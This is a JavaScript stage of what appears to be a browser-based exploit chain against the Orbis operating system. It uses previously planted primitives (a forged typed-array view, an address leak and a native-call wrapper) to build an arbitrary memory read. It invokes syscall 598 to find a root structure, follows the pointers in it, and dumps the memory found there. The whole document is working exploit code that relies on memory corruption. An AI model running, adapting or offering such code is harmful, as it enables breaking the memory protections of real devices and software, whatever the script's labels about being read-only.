// Orbis deep walk: derives root from 598 on this boot, reads the root
// structure, follows ALL extracted pointers with 96-byte reads, and
// returns hex + ascii for each. Fully boot-portable — zero stale
// addresses. Safe mark() helper; read-only.
var result;
var phase = "preflight";
try {
  var state = window.__fw14ArrayState;
  var plan = window.__fw14NativePlan;
  var native = window.__fw14NativeInvoke;
  if (!state || !plan || !native || typeof native.call !== "function" ||
      !state.view || !state.array || !state.a || !state.ownedTypedView ||
      !Number.isSafeInteger(state.calibratedViewBase) ||
      state.array[0] !== state.a || !plan.store || !plan.pivot ||
      !plan.stack || !plan.frame || !plan.addresses ||
      !Number.isSafeInteger(plan.target) ||
      !Number.isSafeInteger(plan.webkitBase) ||
      typeof native.wrappers.sys598 !== "number")
    throw new Error("held_plan_missing");
  var forged = state.view;
  var carrier = state.ownedTypedView;
  var base = state.calibratedViewBase;
  if (carrier.length !== 65536 || carrier[0] !== 0x31 ||
      carrier[7] !== 0xa8 || base % 4096 !== 0)
    throw new Error("carrier_canary_changed");
  function bytesAt(index, count) {
    var out = [];
    for (var n = 0; n < count; n++) out.push(forged[index + n]);
    return out;
  }
  function valueOf(bytes) {
    var value = 0;
    for (var n = bytes.length - 1; n >= 0; n--)
      value = value * 256 + bytes[n];
    return value;
  }
  function pointerBytes(value) {
    if (!Number.isSafeInteger(value) || value < 0 ||
        value >= 0x1000000000000)
      throw new Error("pointer_invalid");
    var out = [];
    for (var n = 0; n < 8; n++)
      out.push(Math.floor(value / Math.pow(2, n * 8)) & 255);
    return out;
  }
  function addressOf(object) {
    try {
      state.array[0] = object;
      return valueOf(bytesAt(state.index, 8));
    } finally {
      state.array[0] = state.a;
    }
  }
  var carrierIndex = addressOf(carrier) - base;
  var carrierSlot = carrierIndex + 8;
  if (!Number.isSafeInteger(carrierSlot) || carrierSlot < 0 ||
      carrierSlot + 8 >= 16777216)
    throw new Error("carrier_slot_invalid");
  var carrierOriginal = bytesAt(carrierSlot, 8);
  function readAt(addressValue, count) {
    if (!Number.isSafeInteger(addressValue) || count < 1 || count > 192)
      throw new Error("read_args_invalid");
    var next = pointerBytes(addressValue);
    try {
      for (var n = 0; n < 8; n++) forged[carrierSlot + n] = next[n];
      var out = [];
      for (var r = 0; r < count; r++) out.push(carrier[r]);
      return out;
    } finally {
      for (var x = 0; x < 8; x++)
        forged[carrierSlot + x] = carrierOriginal[x];
    }
  }
  function mark(phaseName) {
    try {
      if (api && typeof api.markSync === "function")
        api.markSync(phaseName);
    } catch (markerError) {}
  }
  function toHex(bytes, cap) {
    var limit = Math.min(bytes.length, cap || 96);
    var out = "";
    for (var i = 0; i < limit; i++)
      out += ("0" + bytes[i].toString(16)).slice(-2);
    return out;
  }
  function toAscii(bytes, cap) {
    var limit = Math.min(bytes.length, cap || 48);
    var out = "";
    for (var i = 0; i < limit; i++) {
      var ch = bytes[i];
      out += (ch >= 32 && ch < 127) ? String.fromCharCode(ch) : ".";
    }
    return out;
  }
  var before = native.call("getpid", []);
  if (before.high !== 0 || before.value < 1 || before.value > 100000)
    throw new Error("session_pid_changed");
  mark("deep_preflight");
  // Step 1: 598 → root base
  phase = "call_598";
  var sizePtrOff = 0x1e00;
  var bufOff = 0x200;
  var rootBufAddr = plan.addresses.frame + bufOff;
  var sizeAddr = plan.addresses.frame + sizePtrOff;
  var fv = new DataView(plan.frame.buffer);
  var sizeOrig = fv.getUint32(sizePtrOff, true);
  plan.frame.fill(0, bufOff, bufOff + bufLengthSafe());
  function bufLengthSafe() { return 0x1000; }
  fv.setUint32(sizePtrOff, 0x1000, true);
  fv.setUint32(sizePtrOff + 4, 0, true);
  var call598 = native.call("sys598", [rootBufAddr, sizeAddr]);
  var errno598 = (call598.value === -1) ? native.readErrno() : null;
  fv.setUint32(sizePtrOff, sizeOrig, true);
  var rootLo = fv.getUint32(bufOff, true);
  var rootHi = fv.getUint32(bufOff + 4, true);
  var rootBase = rootHi * 0x100000000 + rootLo;
  if (rootBase < 0x1000 || rootBase >= 0x1000000000000)
    throw new Error("root_base_invalid_" + rootBase.toString(16));
  mark("deep_598_ok");
  // Step 2: read root structure
  phase = "root_read";
  var rootBytes = readAt(rootBase, 192);
  var rootHex = toHex(rootBytes, 180);
  var rootAscii = toAscii(rootBytes, 90);
  mark("deep_root_read");
  // Step 3: extract pointers at known offsets
  function u32At(bytes, off) {
    return ((bytes[off]) | (bytes[off + 1] << 8) |
            (bytes[off + 2] << 16) | (bytes[off + 3] << 24)) >>> 0;
  }
  function u64At(bytes, off) {
    return u32At(bytes, off) + u32At(bytes, off + 4) * 0x100000000;
  }
  var ptrOffsets = [0x18, 0x20, 0x38, 0x40, 0x48, 0x70, 0x78];
  var ptrs = [];
  for (var p = 0; p < ptrOffsets.length; p++) {
    var off = ptrOffsets[p];
    if (off + 8 <= rootBytes.length) {
      var ptr = u64At(rootBytes, off);
      if (ptr >= 0x1000 && ptr < 0x1000000000000)
        ptrs.push({ off: off, addr: ptr });
    }
  }
  // Step 4: follow each pointer with 96B reads
  phase = "follow";
  mark("deep_follow_start");
  var followData = [];
  var followOk = 0, followFail = 0;
  for (var f = 0; f < ptrs.length; f++) {
    var tgt = ptrs[f];
    try {
      var fbytes = readAt(tgt.addr, 96);
      followOk += 1;
      followData.push({ off: tgt.off, addr: tgt.addr,
        hex: toHex(fbytes, 96), ascii: toAscii(fbytes, 48),
        ok: true });
    } catch (fError) {
      followFail += 1;
      followData.push({ off: tgt.off, addr: tgt.addr,
        hex: "", ascii: "", ok: false });
    }
  }
  mark("deep_follow_done");
  var after = native.call("getpid", []);
  mark("deep_done");
  var restored = true;
  // Build compact per-pointer results
  var ptrList = "";
  for (var pl = 0; pl < ptrs.length; pl++)
    ptrList += "+" + ptrs[pl].off.toString(16) + ":" +
      ptrs[pl].addr.toString(16) + " ";
  var hopSummaries = [];
  for (var h = 0; h < followData.length; h++) {
    var fd = followData[h];
    hopSummaries.push("+" + fd.off.toString(16) + ":" +
      (fd.ok ? "ok/" + fd.hex.slice(0, 40) : "FAULT"));
  }
  // Build per-pointer hex fields (split to stay under 512 chars each)
  var hexA = "", hexB = "", hexC = "", hexD = "";
  for (var hx = 0; hx < followData.length; hx++) {
    var fd2 = followData[hx];
    if (!fd2.ok) continue;
    var tag = "h" + hx + "[" + fd2.hex + "]";
    if (hexA.length + tag.length < 440) hexA += tag + " ";
    else if (hexB.length + tag.length < 440) hexB += tag + " ";
    else if (hexC.length + tag.length < 440) hexC += tag + " ";
    else if (hexD.length + tag.length < 440) hexD += tag + " ";
  }
  var asciiAll = "";
  for (var as = 0; as < followData.length; as++) {
    if (!followData[as].ok) continue;
    asciiAll += "h" + as + "[" + followData[as].ascii + "] ";
  }
  result = { id: "orbis_deep_v1",
    status: (after.value === before.value && after.high === 0 &&
      followOk > 0) ? "pass" : "fail",
    details: { ret598: call598.value,
      root_base: rootBase.toString(16),
      root_hex: rootHex.slice(0, 380), root_ascii: rootAscii.slice(0, 180),
      ptr_list: ptrList.trim().slice(0, 300),
      hop_ok: followOk,
      hop_summaries: hopSummaries.join(" | ").slice(0, 400),
      hex_a: hexA.trim().slice(0, 510), hex_b: hexB.trim().slice(0, 510),
      ascii_all: asciiAll.slice(0, 300),
      clean: after.value === before.value && after.high === 0 &&
        restored } };
} catch (error) {
  result = { id: "orbis_deep_v1", status: "error",
    details: { phase: phase, error: String(error).slice(0, 180) } };
}
return [result];
